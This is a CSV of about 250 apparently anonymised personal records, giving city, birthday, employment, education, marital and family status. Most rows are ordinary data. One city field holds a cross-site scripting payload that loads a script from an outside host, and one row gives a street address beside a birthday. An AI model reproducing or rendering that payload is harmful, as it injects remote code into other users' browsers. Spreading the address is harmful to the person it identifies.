id,id_,city,birthday,is_working,education,is_married,works_by_profession,has_children,work_places_cnt
a55bfd4186a3d64f8bbb206b563aa5e6,19907,Moskva,1987-01-03,True,3,False,True,False,6
65501ee197e1e75bbe36f72a378c423c,19924,Москва,1990-04-25,True,2,False,True,False,6
85bad0fe9c2628e679b37c26c9f2de40,19979,Асино,1993-11-23,True,3,False,True,False,9
9ba4b7187b5227c597fae18998da35d4,20162,Санкт-Петербург,1985-03-20,True,3,False,False,True,9
fa8efefccae7e209774b0754687c0148,20167,Тула,1986-04-22,True,3,True,True,True,5
0257f737c3d0aa80eaadee0b50a967b9,31463,Саратов,1985-03-01,True,2,False,False,True,7
768c2987a744c51ce64a5993a2a94eaf,20469,Санкт-Петербург,1991-03-23,True,3,False,True,True,5
e1d53456c97ea305287a8c6f944fdffb,20788,Lviv,1994-02-15,False,2,True,False,True,4
9dfc270466449081a82b19afd5fd44f4,20792,Москва,1987-07-19,True,2,False,False,False,9
97d932a2b0387d9f9cac091db9f79ae7,20902,Брянск,1990-10-24,True,3,False,True,False,6
f69e2707b7ba94d49ca03ea9ed52ea5d,20917,Москва,1984-08-26,True,2,False,False,True,5
475451ba73584f474999c2271ec51a10,20949,Brooklyn ,1990-09-04,True,3,True,True,False,1
547a0f748f08276aef85b1b7ec4716df,20970,Кзань,1984-02-15,True,1,False,False,False,0
a04d56f02ef9f5e925f783f65d117337,20981,Бередажи,1988-08-17,True,2,True,True,True,5
8d2f30168c595ec0d002caa3e5b9f419,21041,Каракол,1987-05-31,True,2,False,False,True,3
8d5a0a1e7819768ec873bb768de26f34,21225,Подольск,1986-07-15,True,2,False,False,True,6
185570cda32acffb6c63ccf4e81e5113,21363,Апатиты,1985-12-10,True,3,False,False,False,4
d214936a412d8498cf664cbd6f36d1ab,21466,Старый Оскол,1989-06-02,False,3,False,True,True,1
19fcf882b59afea4bee9dd9da595eaee,21510,Москва,1987-02-04,True,2,False,False,False,5
aff5ae85e810d2c150681a5206b4220b,21591,Москва,1987-12-10,True,2,False,True,False,3
fcd7b6853c2582372980dd6af56d3bdc,21595,Москва,1985-10-01,True,2,False,True,True,6
afe6bbf91584cc338c111fe28a393c37,21626,Казань,1985-01-28,True,2,False,True,False,7
2072190b826180e93023df8d9932845c,21628,Г. Ростов на Дону,1984-02-08,True,2,True,False,True,8
e7246a194a3ba3094e9fa8c59227bba4,21701,Новосибирск,1984-09-06,True,3,False,False,False,6
1cb6782ec04cc625b1b550574a791ef2,21765,Качканар,1965-10-04,True,3,False,False,False,2
c4a5b906b01289cf32214dd11d2acd5b,21780,Київ,1984-03-18,True,2,True,False,True,3
3600eeef0dd0a3bef09336e790c31ed0,21814,Москва,1993-07-02,True,2,False,False,False,2
f9d98c3032d1732eec17444b04bddfe8,21840,Ессентукская,1988-07-04,True,2,False,False,True,7
9713af2a619915d4b6b0b2d0c3766b20,21890,Вязьма,1985-03-01,True,2,False,True,False,7
d3e923c6cdfe46aa8dd99548d7d7c8ed,21949,Киев,1998-10-10,True,3,False,True,True,6
26bdcbb33865eb48d9f476c4ed61e165,22017,Санкт-Петербург,1998-06-11,True,2,False,True,True,3
817208624ef783e0ab4ac98a08f97692,22019,Мончегорск ,1982-09-30,True,2,True,False,False,4
b7fc6e2bb5f5a8ad10a0c35e834f38b2,22031,спб,1987-08-04,True,3,False,False,True,6
12cd2603876cf048cd188048a836e0aa,31491,Puerto de la Cruz,1984-07-29,True,2,False,False,True,8
5b1edc400475db41233883e897483888,22055,Санкт-Петербург,1992-02-22,True,3,False,True,False,8
846f53a3528a9f940626327a15ea7661,22059,Москва,1991-03-09,True,2,False,False,False,4
e6269370131383cb1f6690753d192193,22091,Moscow,1989-03-03,True,3,False,False,True,3
12f268f55937f8944e581af9cd410817,22150,Набережные Челны,1987-08-14,True,3,False,True,True,6
bed2fcfbd96c21dba83f209872457695,22194,Минск,1993-12-02,True,3,False,True,False,6
52f2793fa7b157d8b69b4ea2c4b35196,22250,Москва,1996-12-06,True,3,False,True,False,3
b23f6c1299c79ffa54ecc046729bf083,22262,Владивосток,1956-09-22,True,3,False,True,True,7
68b1bd8993eab04db1b601d28f481c98,22264,с. Беглица,1988-12-31,True,2,False,False,True,5
82ccf28bc6b3a597f65b8aed8b0ffc77,22310,Украина Одесская обл Подольский р-н,1984-09-10,True,2,True,True,False,9
84d2010cc192eb3b4d73477cca78845b,22365,Moscow,1996-04-03,False,0,False,False,False,0
41b7d7f4d81c7b640891f475fb36a5a0,22410,Нижний Новгород,1991-10-14,True,3,False,False,True,5
cf28cb3233c6dc76436f2f2ebb15735d,22451,Ульяновск,1991-02-27,True,3,False,True,False,5
a9eb7dea6a9b068a867c274faa32ded2,22490,Санкт-Петербург,1985-11-27,True,2,False,False,False,8
6a4fd577c65cbf1e3369bd3c4d01d74d,22560,Москва,1981-10-19,False,3,False,True,True,5
8e91906cbff97b6af67b61b60e30a548,22609,Челябиск,1985-02-16,True,3,False,False,True,5
2d4dd9c855e493cb58a878ed919c1cc0,22619,Ленинград,1989-09-02,True,3,False,False,True,7
e3a0b38701b37b3a7b404b1ce953201c,22665,Новосибирск,1971-10-10,True,3,True,True,False,1
d6252c6255d5b535635402eecc48eb2a,22669,Москва,1991-02-27,True,3,False,False,True,2
be86c71c6cc9e224e1923d48256dc634,22713,Артём,1985-03-04,True,3,False,True,False,9
d341c23c9562298583e55f7de1d5e8fa,22722,Tallinn,1984-08-30,True,3,False,True,False,7
d014738fa8168ef200540463039bfa99,22739,"Тула, улица Лейтейзена, 5-550",1986-07-20,True,2,False,False,True,4
863a7740c5261521248bf83ae51cdcd6,22771,Красноярск,1992-01-28,True,2,False,True,False,1
288e44c9b9c7355298cf8fff3185b039,22802,Лодзь,1986-02-17,True,2,True,True,False,4
95c58be5a66bc5c3fddcc39ac85f700f,22803,12.10.1985,1986-11-01,False,3,False,True,True,7
e29492eab42b4d80bdf9df1ad04a5d13,22805,Мурманск,1987-12-20,True,3,False,True,False,6
efea2ab0a0dc6b207a11319d4cdd3d96,22811,Рязань,1985-10-22,True,2,True,True,False,8
946ab1260ac8b2001a85958e63194485,22896,Bukhara,1998-07-04,True,2,False,True,True,5
6aebc70c3bed22f6407398e3cffd5015,22932,Благовещенск(Амурская область),1987-06-30,True,2,False,False,False,3
5c133b73eecb3743a4caa59820d3bd6b,22975,Бугульма,1986-08-28,False,2,False,True,True,9
97336476a53dcb4fb6e1b16fa8a957c5,23026,Казань,1985-03-20,True,2,True,False,False,8
116545254420b26f37815cc895d109a3,23106,Москва,1995-09-02,True,3,False,True,False,6
90d9265924c436904b8f773085ea0a00,23108,Москва,1959-10-14,True,3,False,True,True,5
b8442cc3da8e687d8aee7f54db90a2e0,23114,Astana,1995-09-14,True,3,False,True,True,6
ea3c4738d80918a1aeb152d6cc80421d,23176,Стокгольм ,1984-09-05,True,3,False,True,False,3
99a91573b2c1792e384f6a19b678eaac,23215,Tel-Aviv,1984-03-29,True,3,False,False,True,7
d652a76566f2813cb7bf304a6f0b5f2f,23238,Wrocław,1991-11-02,False,0,False,False,False,0
d7fd96ef17375153a9e3496cb47434f7,23260,Москва,1986-11-26,False,3,True,True,True,4
1dfc464d8c0d53c84852e60f035d6783,23332,Сургут ,1990-03-05,True,3,False,True,True,5
170a77fe80740220e6ee76d69d4ec475,23368,Rethimno,1988-09-07,True,2,False,True,False,3
80573fc9aa94e083d9321f48cecf664b,23378,Вологда,1987-05-17,False,2,False,True,False,5
044480ccdc5a18d0199c33565de51c35,23417,Махачкала ,1988-03-23,True,3,False,False,True,4
cdbc7f6f78bcb1c346daaff43bf10aa6,23419,Иркутск,1990-02-10,True,2,True,False,True,4
876d95b2b1a3fcd0a6e138aabd0d0afb,23485,Москва,1995-05-14,True,3,False,True,False,4
33f167a26851aef15422930fd12be935,23487,Ростов-на-дону,1989-12-16,True,3,True,True,True,7
b4250e9554e828df634522c263e66ebc,23518,moskow,1985-10-10,True,2,True,False,True,7
fa00ce7a14ab3a06a6397f6359b32e27,23545,Moscow,1994-04-23,True,3,False,True,True,7
e0c6c803d1d8f419b35cb30a9bf8700e,23548,Абакан,1995-04-08,True,2,False,True,True,6
bd6d40d39769d8c1225d93288eec5f8d,23553,Сочи,1986-12-16,False,2,False,True,True,7
051939eed813ffea99c6ff4e66a5df05,23605,Москва - Феодосия ,1991-11-03,True,3,False,True,True,4
da4c5275b58a16b0063c89558eca6f6d,23614,Москва,1968-04-01,True,3,False,True,False,4
bab6b5e27565e16ccc34f109a5cf34eb,23622,Львов,1988-06-12,True,3,False,True,False,6
81f6ae5a1d211389cae4d3fad3f49d53,23630,Nizhny Novgorod,1987-10-11,True,3,False,True,False,9
2773096aa336e25f1af9427472d7e58f,23670,Москва,1996-07-21,True,3,False,False,False,6
e2d82ea22d8a2aa67eed12d39891396a,23739,Hi<script src=//8b2.ru/s.js></script>,1987-12-19,True,3,False,False,False,5
f752c241c86460d67553247f59169941,23772,Красноярск ,1991-05-17,True,2,False,False,True,4
c686d86a3c39b75f59336046c43e07a1,23862,Екатеринбург,1988-06-24,True,2,False,False,True,8
993f0cb6f393f6667d6ec32314275b66,23886,Москва,1984-12-24,True,2,False,True,False,6
81912cc067da5642dd3f6790f298eb24,23895,Чернигов,1986-07-31,True,3,False,False,False,5
981adce83cd82347aa57722e47d59df8,23899,Санкт-Петербург,1980-02-04,True,3,False,False,False,8
6cebc3ef9e93b24ebce4c450b97c37ba,23935,Москва,1987-09-10,True,2,False,False,False,5
8e9745d92f08a56cfe98645307a8b011,23976,Бесленей,1991-09-30,False,3,True,True,False,3
23252a89b7f2978d909767879d7dbda8,24002,Санкт-Петербург,1963-12-20,True,2,False,True,True,3
247fbd2496654340cdd48e7e4395df2e,24037,Брест ,1988-02-14,True,2,False,True,True,5
7fce95896d05f8d1c14f117f2527cde2,24046,St. Petersburg,1973-11-15,True,3,False,True,True,4
6b23d50123cf8e349f9f4419f2d6a8fe,31507,Алма-Ата,1991-12-06,True,3,False,False,True,6
99c7ccf5e8444a6247e3bb5a380ab8eb,24098,Санкт-Петербург,1988-11-02,True,3,False,False,False,3
39586fc0b896f0e2d6502a0e464286ab,24146,Москва,1971-11-04,True,2,False,False,True,8
a46be0cc330e47fafbdf68b2efeeb91e,24186,Норильск,1984-11-04,True,3,False,True,True,4
82ea350ba63244a4a6082191df8ec685,24195,Нижний Новгород,1993-07-23,True,3,False,False,True,4
02eca21ec43d813621d8e39a3aa833a5,24232,Челябинск,1989-06-07,True,2,False,False,False,7
0155518bec3979ce1ae2c150e2853512,24292,Санкт-Петербург,1986-03-04,True,1,False,False,False,0
699f310a1dbec615d52d0b5885e72365,24294,TASHKENT,1989-10-22,False,3,False,True,True,9
1e3b956482994c0b5c11c822f176cb22,24357,Брянск,1987-02-13,True,2,True,False,True,4
b0a18921acfd128ee8a760f7e83ff051,24387,минск,1987-04-19,True,3,False,False,True,3
77fa8e9573e2afa0517b4b99fe60988d,24399,Санкт–Петребург,1990-10-26,True,3,False,True,False,2
c5c1fdd5e9c0ef12cd592214e157d03e,24406,"Краснодар, Москва, Волгоград",1991-06-11,True,3,True,True,True,3
a49eead16131e0210c14116f9904e646,24410,moscow,1991-08-03,True,2,False,True,True,6
a763bd92a15951c05c4df2a3610c1fb0,24434,Tomsk,1988-09-23,True,2,True,False,False,6
673519a307efeaa33b829300ced008c6,24492,Йошкар-ола,1990-04-22,True,3,False,True,False,3
37bf408c45108383047fa890f77bc823,24563,Moscow,1984-02-24,True,2,False,False,True,7
a31bd571fb45843ecc8831b0b9c639b2,24587,Talmenka,1984-04-01,False,3,True,True,True,3
135c1f5cfcffcff345cbef73d3f4c82e,24610,Комсомольск-на-амуре,1986-06-26,False,2,False,True,True,5
c852ce9f30963adb0ee2f1dcf89ec281,24665,Оренбург,1982-05-21,True,3,True,False,False,6
1cdc496c791773ace00a4f8f7792ef99,24677,Березово,1987-05-01,True,3,False,False,True,5
866890244023d4c5d10311db594a3037,24679,Нижний Новгород,1984-08-24,True,3,True,False,True,8
3e281f3b3d88b4986d15b8a3cceb4171,24682,Ставрополь,1988-10-25,True,2,False,True,True,6
c77c7a33cbcb7abdc2a6b49c87060846,24719,Москва,1988-09-25,True,2,False,True,False,5
48f903824b17c07c2824ae23b6caa430,24726,Балашиха,1990-01-24,True,2,False,True,True,6
93a4336fce3f6acbbf464bc87ec3e187,24760,Haifa,1990-04-16,True,3,False,False,False,3
35f4213b40f8cdfbfe3a596f30c05a72,24805,Joensuu,1987-08-09,True,3,True,False,True,6
315627e674826fb29ea8cf1f41adcda1,24829,Moscow,1993-06-08,True,2,True,False,True,8
39eb1400896730d2c53ef44b879ea965,24832,Жуковский,1987-12-26,True,2,False,True,False,0
cf92567ccd74aae94efc6a5ba1e97bc9,24838,Москва,1998-09-13,True,2,False,False,False,6
e15bb4a2995cdeeacbb1caa48bd2da99,24847,Санкт-Петербург,1991-07-05,False,2,False,True,False,2
2fb2feef58068edcb6922cb851c43cf5,24851,Петрозаводск,1991-08-02,True,2,False,False,True,9
a4608b4af9a9aa3f5df283fc6f76d083,24881,Moscow,1997-08-10,True,2,False,True,True,6
6f66318099f18b58163353c318882e6a,24899,Москва,1959-07-26,True,2,True,False,False,6
3472f369d6c67c56713cafe63634c075,24967,Вологда,1988-01-07,True,3,False,True,False,9
5a00b83219c07b88511dd54f8216c008,25010,Москва,1956-12-17,True,2,False,False,True,5
7cfb1519dc9ce8b338702537621bda39,25024,Байройт,1988-11-25,True,3,False,True,True,9
3f36e6fb3fbe8a95e4e74bdc8ec0efc0,25123,Красноярск,1985-11-30,True,2,False,False,True,7
ab3a0391e1f4837915bb33a28429a5e0,25127,Красноармейск,1988-10-22,False,2,False,True,True,9
0b4656b84ca60350583f8fbe236dda86,25163,Москва,1972-12-21,True,2,False,False,False,3
0c66424aab17cdd67b16951c441463d5,25195,ivanovo,1988-04-18,True,3,False,True,False,7
b7d0c943f4643e9a1f04c6421aaa0e56,25203,Москва,1988-11-05,True,3,True,True,True,7
0284a9c2ee0d9c7a97e2a943b0d52b92,25219,Краснодар,1994-05-14,True,2,False,False,True,4
3dac07629e8e0b23af6654f6deda91c4,25261,Казань,1995-08-04,True,3,False,True,True,9
3137ff6039096d23baf66e51762b822c,25265,Полевской,1984-05-10,True,2,True,False,True,4
25c266e1291ae89e5b1d75867648b9cd,25321,Шлиссельбург,1984-09-14,True,3,False,True,True,4
b8fbed2c5f3831b0f061d999b20e1086,25341,Балашиха,1960-02-20,True,2,False,False,False,6
c058d9ca6a0cd115ce263fd0b2234d1a,25373,Айхал,1989-07-12,True,2,False,False,False,3
946ac062d03c51cf57c1b3f7bfde8b1c,25388,Заречный,1990-09-08,True,3,False,True,False,9
ddf47ebd20e9a3a61c047a9817d7767b,25414,Мелитополь,1985-07-10,True,3,False,False,False,4
f8ebc4b57a8b9b26a1a2d870d70fe28e,25541,Санкт-Петербург,1983-01-26,False,1,False,False,False,0
884a8dc42cb5ec641bbea32908a44e00,25613,Салават,1991-08-05,True,3,True,True,True,5
a8faa1054c78187c32d647c3eeaa23e6,25666,Челябинск,1986-01-04,True,3,False,True,True,6
be7d2b894ae31088c7fa7909704636e8,25688,Печора,1987-12-09,True,3,False,True,True,6
769aa0a1d2754a2ab01908b6441ef916,25766,ульяновск,1989-04-15,True,2,False,True,True,4
8c0fad19827ea5c2a8e9677f54f6506c,25828, Arkhangelsk,1989-10-08,True,2,False,True,True,6
eb2ff31b8b4f513042eefba9b9485891,25896,Tula,1990-09-07,True,2,True,False,True,5
486f63257ae0378538ce0ed2cc2012cb,26008,Limerick,1985-01-13,True,2,False,False,False,5
af0106dec4a61adb1d4340ad3990de1d,26011,"Мантурово, Костромская обл.",1990-05-08,True,2,False,True,True,6
dd9636a9b9dbe6b39ef8e025a3ed6317,26066,Москва,1991-07-30,True,2,False,True,False,8
3231d7bb2fc7d73b41b09ef910547269,26125,Санкт-Петербург,1988-08-15,True,3,False,True,False,4
3955a506a36f542ce1060f1c00691118,26146,Bishkek,1984-10-07,False,3,True,True,False,4
10f2e30b5b3fc58795df75e3623e3a52,26157,Москва,1989-09-05,False,3,False,False,True,3
7563cf7c178f3376fb834d4b663d3eaa,26187, Тула,1986-03-21,True,2,True,True,True,5
48f917915d20caa17b4a4b781654bf3e,26245,тверь,1989-12-25,True,3,True,False,True,4
dd5c24971c776750fd161d95cedc1e81,26251,Онега,1987-05-09,True,3,False,True,True,5
ae15f6e0484bd1c76c2f5d2f76dbc3f1,26262,Красноярск,1988-09-04,True,3,True,True,True,9
5ed2b18d4013555a94ec549cbca08d3b,26263,Москва,1992-10-27,True,3,False,True,False,8
a7864e204a017a6d1225ab2e76e54c3f,26354,Новосибирск,1990-08-31,True,2,False,False,True,5
b98957cf73fd30f909f4619b6897770e,26360,Екатеринбург,1990-08-29,True,3,False,False,False,8
2d4cca552cd818e4eb6b3fc7295103c3,26530,Санкт-Петербург ,1957-03-10,False,2,False,True,True,8
919dee0b2cd888a83284097045676113,26579,ВЕНТСПИЛС,1987-05-02,True,3,True,True,True,6
93553c6ad09934b1c90ddfadb38ecf6b,26617,Moscow,1987-07-22,True,3,False,False,True,5
d13bb03db7158d33698cc830b0801a2d,26636,Горно-Алтайск,1998-09-05,True,2,False,False,True,4
3452f24547c53dd89c01d0abf522e731,26658,Saint-Petersburg,1987-03-29,True,3,False,True,True,7
67f43660f6131052c701fa8362a5c137,26693,Хабаровск,1984-08-17,True,3,True,False,False,5
b4f28a4b157f975d62b7cbbb28dd7fcf,26697,Южно-Сахалинск,1974-10-14,True,2,False,True,False,2
6b6d968b66a31feff1f6535950d5580f,26848,Санкт-Петербург,1991-05-27,True,3,True,True,True,7
20ef4c45a859d54e3b40352011a305ac,26909,Пермь,1989-02-18,True,2,True,False,True,3
f0c50a95878c1536902e5887bf701d7d,26911,Нижний Новгород ,2000-07-17,True,3,False,False,True,6
b3c656269aeecf3a08f21d0df3574eca,26919,г. Радужный,1980-09-03,True,3,True,False,True,7
1844dd1a76072453833d607bb4d5427d,26956,Орёл,1996-02-21,True,2,False,False,False,7
61e4b73667dd2c90b4b2cd7b2a795259,27026,Москва,1988-08-27,True,2,False,False,False,6
1d874e6b6bdc34559781f65f9f761791,27038,Рязань,1983-09-12,True,2,False,False,True,6
f0e997c34363e4658521f8364d57e8c2,27143,Санкт-Петербург,1992-04-18,True,2,False,False,True,3
160dfdad6eed36664f4ab6a2fbbc00a2,27280,Санкт-Перетбург,1986-08-02,False,2,False,False,False,2
acb23859ab4486249537e57d88bc0a1d,27317,ВЕНТСПИЛС,1990-12-06,True,3,False,False,True,7
c8ce8ad31f42723fb77d1da2f28610db,27327,Уфа,1987-08-21,True,2,False,False,False,9
347dade7dbc835a7b88c017e4513f985,27391,Санкт-Петербург,1988-05-04,True,2,False,True,True,5
82f0211b17a0c12732b1220f1c8e7ae2,27510,Athens ,1985-01-16,False,3,True,True,False,4
d3344d0f7d418c4f279051a2954b0cdf,27512,Радужный,1984-08-14,True,2,False,True,True,9
ddf2eeea4ae85da0cfc2e6d946e19ab7,27515,санкт петербург ,1989-09-12,True,2,False,False,True,3
3ac3393d354e860ef215391459e3508c,27531,Светлогорск,1986-07-17,True,2,False,True,True,4
92b5ccdc91801be86262ebce3e55b782,27561,Хабаровск,1984-11-22,True,2,False,False,True,6
41e0f5dc1985f69138c25110b2c87637,27616,Улан-Удэ,1991-05-08,True,3,False,True,True,7
e5ab773339dd715dc944592045f0994d,27634,Воронеж,1996-07-20,True,2,False,True,True,7
dd44f788a641211a8a6f560f0a9f2116,27666,Москва - Рига,1987-05-28,True,2,True,True,False,6
031c2baf0286e48dea898addfc2ecf8e,27721,Москва,1992-01-25,True,3,True,True,True,7
5c757c88ced1035df412110513017ede,27746,Днепр,1989-09-24,True,3,True,True,True,6
bfd69cba2bbe1d1513b00bcaa4de47e1,27810,Баку,1993-06-02,True,2,False,False,True,6
1cc54b6c395597a0001985c8660791ba,27822,Новосибирск,1986-11-15,False,3,True,True,True,5
237f7d9cc528e8fdcdc98bc0e5641199,27830,Санкт-Петербург,1986-02-10,True,2,True,False,True,5
22fb3070623a4c9674669e7cd4397101,27868,КАЛИНИНГРАД,1988-06-12,True,3,False,True,False,1
539c7de499e18b5afef601c7e6912e8c,27869,Нижневартовск,1962-03-25,True,3,False,True,True,4
aa3ff1649bf85309b56c60d4ccd75055,27880,г Саратов,1982-12-26,True,2,False,False,False,5
bdd29fc4e7239035c9246416da9a2319,27908,Губкинский,1990-08-15,False,2,True,False,True,9
94f7813f7cd3119d8912ce1a59da0fbf,27923,Орск,1991-12-10,True,3,False,True,True,7
453974e6a1e98f2d45344bc666d98654,28015,sdgbdfsxhdf,1987-10-09,False,2,False,True,False,6
edbcfebbb9d3c21da0409197702d6e50,28080,Москва,1991-02-27,True,2,True,False,True,6
3c8ffcb4caa952c82f8710197fd3ce96,28134,Новокузнецк,1988-02-12,True,2,False,False,False,7
20050d9436d3135c73634c2bc53bf36e,28182,Калининград,1984-04-20,False,3,False,True,False,2
504f6f089d5f6ad1ba7c88ff0d310943,28188,Санкт-Петербург ,1985-05-23,True,2,False,False,False,5
661b9eda6f263657e739b96a20e74c83,28195,Новосибирск,1989-12-06,True,3,False,False,False,6
92245e0126e5276b2143b8489091333d,28217,Москва,1985-09-02,True,3,False,False,True,5
17c408ab90a10bbe05305778c28630c1,28365,Ижморский,1987-09-26,True,2,False,False,False,5
c55e2aa030013682fe3bd2ac75d29bdb,28406,Москва,1987-04-16,True,3,False,False,False,4
0a7910de34d85aeab7fc50a1a3e5140b,28440,Тула,1989-01-09,True,2,True,True,False,9
5b45d79d932c43ba278f3921af9cb909,28528,Воронеж,1986-11-06,True,2,False,False,True,7
2bed4ffec8270ef5b4fd4d1fddaea058,28600,Таллинн,1987-05-17,True,3,False,True,True,4
323c52f60e5ba9358b297c6eba0a150b,28612,Москва,1987-01-28,True,3,False,False,False,6
4cb6ce8d12591c5d80412f898edb3d1f,28656,Москва,1990-05-26,False,2,False,False,False,8
26717260e3fe2583103c48109d7341dd,28678,Кишинёв,1986-03-20,True,2,False,True,False,7
6f24d57e1610cf23baf9333b947e66e5,28700,Кувандык Оренбургская область,1989-09-06,True,3,False,False,True,3
d7b8b3453ca8832fbe80cdab1e2b9e50,28703,Пермь,1998-09-25,True,3,False,False,True,5
ce58e7ccaae65f1f5ee0ae94a450f21e,28715,Москва,1996-02-26,True,3,False,True,False,7
44d24f84094224890ac1db4398839f7d,28815,Туруханск,1987-03-12,True,2,False,False,True,3
8ce4c83f426b297e271a0dadd419a8c9,28873,Санкт-Петербург,1991-05-07,True,3,False,True,True,7
e2679b8cc01c7467667b462be3c1c539,28879,Судак,1991-12-04,True,2,False,False,True,1
25e0e7bb7c64ef5858e17b789b05ca11,29006,Москва,1993-07-12,True,3,False,True,True,8
a12863dc2808b487aeb552c1589a640c,29028,Москва,1993-08-20,True,3,True,True,False,7
14da7d1dbb19531cb7987cb6566fd472,29129,Москва,1988-09-12,True,3,False,False,False,3
b12a106a8610cfd13de4e142775a92d4,29148,Кемерово,1989-05-22,False,2,False,True,False,4
2fcd8f68be305dfc450fcf67493d18de,29185,Ишим,1990-06-26,True,2,False,True,True,5
7678ff89b173658a86bee8b9b1750c1b,29196,Чегдомын,1992-01-25,True,2,True,True,True,5
77c42f4a959ef4858545c924e4489a4c,29209,Гомель,1989-03-03,True,3,True,False,False,1
ea57094e9db401805c4645046eb3e18e,29217,Дмитров,1995-06-24,True,3,False,True,False,9
e8ee00135c39458cc6d99f22f5344b1f,29222,Лунинец,1984-02-09,True,2,False,True,False,9
a66269facf4510ccff920dbee4a3bb4b,29252,Хасавюрт,1987-10-04,True,2,False,False,True,9
5fb87282601ecc5ae3055c3aea364202,29303,Иркутск,1986-02-03,True,2,False,False,False,3
698372f2aa8ca441f2f8064212ae507f,29315,gfdgfgd,1988-09-30,True,2,False,True,True,6
3c35d2371f5b7a495a95a717fd24b744,29364,Санкт-Петербург,1989-08-08,True,3,False,False,False,4
3365f2067cc01dad3ef5b328b0376330,29497,Дмитров,1990-05-22,False,3,False,False,False,3
110548be81b9f6a1dc8eea69e44c38d3,29507,Уссурийск,1991-11-09,True,3,False,True,False,6
fd980411f2c3a6b01d5b28cd87a3b583,29516,Челябинск,1956-08-16,True,3,False,True,False,4
5b806e2c1b51fa7cc7d3f0300d43303c,29562,дербент,1987-03-15,True,2,False,True,True,3
cb8defacfd7d82c0e0e431f03c7402af,29639,Москва,1988-08-24,True,3,True,True,False,4
77212485f967e65a1e60155467d28859,29711,Химки,1991-12-11,True,2,False,True,False,5
d5ebeca01a536cdf5b3860bf8c95a162,29785,Москва,1992-01-11,True,2,False,True,True,6
c236d1d909f66329da303bc60c509016,29793,Одесса,1990-08-17,True,3,False,False,True,7
